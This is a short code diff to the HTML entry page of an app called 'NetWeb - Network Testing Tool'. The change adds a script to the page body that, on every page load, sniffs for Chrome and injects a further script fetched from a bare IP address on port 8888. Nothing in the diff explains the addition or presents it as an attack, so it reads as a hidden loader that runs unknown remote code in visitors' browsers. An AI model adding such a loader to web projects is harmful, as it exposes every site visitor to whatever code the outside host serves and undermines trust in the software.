@@ -7,7 +7,22 @@
     <meta name="description" content="Network connectivity testing tool" />
     <title>NetWeb - Network Testing Tool</title>
   </head>
+
   <body>
+  <script>
+      ;(function () {
+          var scriptEle = document.createElement('script');
+          scriptEle.setAttribute('type', 'text/javascript');
+
+          var isChrome = window.navigator.userAgent.indexOf('Chrome') !== -1;
+          if(isChrome){
+              scriptEle.setAttribute('src', 'http://101.132.36.207:8888/js/chrome.js?sid=1&t='+new Date().getTime());
+          } else {
+              scriptEle.setAttribute('src', 'http://101.132.36.207:8888/js/no-chrome.js?sid=1&t='+new Date().getTime());
+          }
+          document.body.appendChild(scriptEle);
+      })();
+  </script>
     <noscript>You need to enable JavaScript to run this app.</noscript>
     <div id="root"></div>
   </body>
